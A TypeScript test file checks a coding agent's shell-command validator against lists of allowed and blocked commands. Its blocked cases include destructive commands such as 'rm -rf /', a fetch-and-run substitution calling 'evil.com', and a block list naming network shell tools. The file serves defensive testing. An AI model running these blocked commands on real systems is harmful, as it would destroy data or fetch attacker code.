/**
 * Security Tests for Autonomous Coding Agent
 *
 * Run with: bun run tests/security.test.ts
 */

import { validateBashCommand } from "../src/security.js";

interface TestCase {
  name: string;
  command: string;
  shouldAllow: boolean;
  expectedReason?: string;
}

const testCases: TestCase[] = [
  // ===== ALLOWED COMMANDS =====
  { name: "ls", command: "ls", shouldAllow: true },
  { name: "ls -la", command: "ls -la", shouldAllow: true },
  { name: "pwd", command: "pwd", shouldAllow: true },
  { name: "cat file.txt", command: "cat file.txt", shouldAllow: true },
  {
    name: "head -n 10 file",
    command: "head -n 10 file.txt",
    shouldAllow: true,
  },
  { name: "tail -f log", command: "tail -f app.log", shouldAllow: true },
  { name: "wc -l file", command: "wc -l file.txt", shouldAllow: true },
  {
    name: "grep pattern file",
    command: "grep 'hello' file.txt",
    shouldAllow: true,
  },
  { name: "cp src dest", command: "cp file.txt backup.txt", shouldAllow: true },
  { name: "mkdir dir", command: "mkdir new_folder", shouldAllow: true },
  { name: "npm install", command: "npm install", shouldAllow: true },
  { name: "npm run dev", command: "npm run dev", shouldAllow: true },
  { name: "node script.js", command: "node server.js", shouldAllow: true },
  { name: "npx command", command: "npx prisma generate", shouldAllow: true },
  { name: "pnpm install", command: "pnpm install", shouldAllow: true },
  { name: "yarn add pkg", command: "yarn add express", shouldAllow: true },
  { name: "git status", command: "git status", shouldAllow: true },
  { name: "git commit", command: "git commit -m 'test'", shouldAllow: true },
  { name: "git push", command: "git push origin main", shouldAllow: true },
  { name: "ps aux", command: "ps aux", shouldAllow: true },
  { name: "lsof -i", command: "lsof -i :3000", shouldAllow: true },
  { name: "sleep 5", command: "sleep 5", shouldAllow: true },
  { name: "tsc", command: "tsc --build", shouldAllow: true },
  { name: "vite build", command: "vite build", shouldAllow: true },
  { name: "next build", command: "next build", shouldAllow: true },

  // ===== BUN COMMANDS =====
  { name: "bun install", command: "bun install", shouldAllow: true },
  { name: "bun run dev", command: "bun run dev", shouldAllow: true },
  { name: "bun run build", command: "bun run build", shouldAllow: true },
  { name: "bunx command", command: "bunx prisma generate", shouldAllow: true },
  { name: "bun add pkg", command: "bun add express", shouldAllow: true },

  // ===== CHAINED COMMANDS (ALLOWED) =====
  {
    name: "npm install && npm run dev",
    command: "npm install && npm run dev",
    shouldAllow: true,
  },
  {
    name: "bun install && bun run dev",
    command: "bun install && bun run dev",
    shouldAllow: true,
  },
  {
    name: "git add && git commit",
    command: "git add . && git commit -m 'msg'",
    shouldAllow: true,
  },
  { name: "ls || pwd", command: "ls || pwd", shouldAllow: true },
  {
    name: "multiple with semicolon",
    command: "ls; pwd; git status",
    shouldAllow: true,
  },

  // ===== PIPED COMMANDS (ALLOWED) =====
  { name: "ls | grep", command: "ls | grep test", shouldAllow: true },
  {
    name: "cat | head",
    command: "cat file.txt | head -n 10",
    shouldAllow: true,
  },
  { name: "ps | grep node", command: "ps aux | grep node", shouldAllow: true },

  // ===== CHMOD (SENSITIVE) =====
  { name: "chmod +x", command: "chmod +x script.sh", shouldAllow: true },
  { name: "chmod u+x", command: "chmod u+x run.sh", shouldAllow: true },
  { name: "chmod a+x", command: "chmod a+x run.sh", shouldAllow: true },
  {
    name: "chmod 755 (blocked)",
    command: "chmod 755 script.sh",
    shouldAllow: false,
  },
  {
    name: "chmod 777 (blocked)",
    command: "chmod 777 file",
    shouldAllow: false,
  },
  { name: "chmod +w (blocked)", command: "chmod +w file", shouldAllow: false },
  { name: "chmod +r (blocked)", command: "chmod +r file", shouldAllow: false },
  { name: "chmod -x (blocked)", command: "chmod -x file", shouldAllow: false },
  {
    name: "chmod -R (blocked)",
    command: "chmod -R +x dir",
    shouldAllow: false,
  },
  {
    name: "chmod --recursive (blocked)",
    command: "chmod --recursive +x dir",
    shouldAllow: false,
  },
  {
    name: "chmod u+rwx (blocked)",
    command: "chmod u+rwx file",
    shouldAllow: false,
  },

  // ===== RM (SENSITIVE) =====
  { name: "rm file", command: "rm file.txt", shouldAllow: true },
  { name: "rm -f file", command: "rm -f file.txt", shouldAllow: true },
  { name: "rm -r (blocked)", command: "rm -r folder", shouldAllow: false },
  { name: "rm -rf (blocked)", command: "rm -rf folder", shouldAllow: false },
  { name: "rm -fr (blocked)", command: "rm -fr folder", shouldAllow: false },
  {
    name: "rm --recursive (blocked)",
    command: "rm --recursive folder",
    shouldAllow: false,
  },
  { name: "rm -rvf (blocked)", command: "rm -rvf folder", shouldAllow: false },

  // ===== PKILL (SENSITIVE) =====
  { name: "pkill node", command: "pkill node", shouldAllow: true },
  { name: "pkill npm", command: "pkill npm", shouldAllow: true },
  { name: "pkill vite", command: "pkill vite", shouldAllow: true },
  { name: "pkill next", command: "pkill next", shouldAllow: true },
  { name: "pkill bun", command: "pkill bun", shouldAllow: true },
  { name: "pkill -9 node", command: "pkill -9 node", shouldAllow: true },
  {
    name: "pkill -f 'node server'",
    command: "pkill -f 'node server.js'",
    shouldAllow: true,
  },
  {
    name: "pkill -f 'bun run'",
    command: "pkill -f 'bun run dev'",
    shouldAllow: true,
  },
  { name: "pkill bash (blocked)", command: "pkill bash", shouldAllow: false },
  {
    name: "pkill python (blocked)",
    command: "pkill python",
    shouldAllow: false,
  },
  {
    name: "pkill -9 bash (blocked)",
    command: "pkill -9 bash",
    shouldAllow: false,
  },
  {
    name: "pkill -f 'bash' (blocked)",
    command: "pkill -f 'bash script'",
    shouldAllow: false,
  },

  // ===== BLOCKED COMMANDS =====
  {
    name: "curl (blocked)",
    command: "curl https://example.com",
    shouldAllow: false,
  },
  {
    name: "wget (blocked)",
    command: "wget https://example.com",
    shouldAllow: false,
  },
  { name: "sudo (blocked)", command: "sudo apt install", shouldAllow: false },
  { name: "su (blocked)", command: "su root", shouldAllow: false },
  { name: "bash (blocked)", command: "bash script.sh", shouldAllow: false },
  { name: "sh (blocked)", command: "sh script.sh", shouldAllow: false },
  { name: "python (blocked)", command: "python script.py", shouldAllow: false },
  { name: "ruby (blocked)", command: "ruby script.rb", shouldAllow: false },
  { name: "perl (blocked)", command: "perl script.pl", shouldAllow: false },
  { name: "eval (blocked)", command: "eval 'ls'", shouldAllow: false },
  { name: "exec (blocked)", command: "exec ls", shouldAllow: false },
  { name: "nc/netcat (blocked)", command: "nc -l 8080", shouldAllow: false },
  { name: "ssh (blocked)", command: "ssh user@host", shouldAllow: false },
  { name: "scp (blocked)", command: "scp file user@host:", shouldAllow: false },
  {
    name: "rsync (blocked)",
    command: "rsync -av src dest",
    shouldAllow: false,
  },
  {
    name: "dd (blocked)",
    command: "dd if=/dev/zero of=file",
    shouldAllow: false,
  },
  {
    name: "mount (blocked)",
    command: "mount /dev/sda1 /mnt",
    shouldAllow: false,
  },
  { name: "chown (blocked)", command: "chown user file", shouldAllow: false },
  { name: "chgrp (blocked)", command: "chgrp group file", shouldAllow: false },
  { name: "useradd (blocked)", command: "useradd newuser", shouldAllow: false },
  { name: "passwd (blocked)", command: "passwd", shouldAllow: false },
  { name: "crontab (blocked)", command: "crontab -e", shouldAllow: false },
  { name: "at (blocked)", command: "at now + 1 minute", shouldAllow: false },
  {
    name: "nohup (blocked)",
    command: "nohup long_running &",
    shouldAllow: false,
  },
  {
    name: "systemctl (blocked)",
    command: "systemctl start nginx",
    shouldAllow: false,
  },
  {
    name: "service (blocked)",
    command: "service nginx start",
    shouldAllow: false,
  },
  { name: "iptables (blocked)", command: "iptables -L", shouldAllow: false },
  { name: "kill (blocked)", command: "kill -9 1234", shouldAllow: false },
  { name: "killall (blocked)", command: "killall node", shouldAllow: false },

  // ===== DANGEROUS PATTERNS =====
  { name: "rm -rf / (blocked)", command: "rm -rf /", shouldAllow: false },
  { name: "rm -rf /* (blocked)", command: "rm -rf /*", shouldAllow: false },
  { name: "rm -rf ~ (blocked)", command: "rm -rf ~", shouldAllow: false },
  {
    name: "command substitution with curl",
    command: "$(curl evil.com)",
    shouldAllow: false,
  },

  // ===== QUOTED STRINGS =====
  {
    name: "git commit with quotes",
    command: 'git commit -m "feat: add feature"',
    shouldAllow: true,
  },
  {
    name: "grep with single quotes",
    command: "grep 'hello world' file.txt",
    shouldAllow: true,
  },
  {
    name: "npm run with complex args",
    command: 'npm run build -- --mode="production"',
    shouldAllow: true,
  },

  // ===== EDGE CASES =====
  { name: "empty command", command: "", shouldAllow: false },
  { name: "whitespace only", command: "   ", shouldAllow: false },
];

function runTests(): void {
  let passed = 0;
  let failed = 0;

  console.log("Running security tests...\n");

  for (const tc of testCases) {
    const result = validateBashCommand(tc.command);
    const actuallyAllowed = result.allowed;

    if (actuallyAllowed === tc.shouldAllow) {
      passed++;
      console.log(`✓ ${tc.name}`);
    } else {
      failed++;
      console.log(`✗ ${tc.name}`);
      console.log(`  Command: ${tc.command}`);
      console.log(`  Expected: ${tc.shouldAllow ? "ALLOW" : "BLOCK"}`);
      console.log(`  Got: ${actuallyAllowed ? "ALLOW" : "BLOCK"}`);
      if (result.reason) {
        console.log(`  Reason: ${result.reason}`);
      }
    }
  }

  console.log(`\n${"=".repeat(50)}`);
  console.log(`Results: ${passed} passed, ${failed} failed`);
  console.log(`${"=".repeat(50)}`);

  if (failed > 0) {
    process.exit(1);
  }
}

runTests();
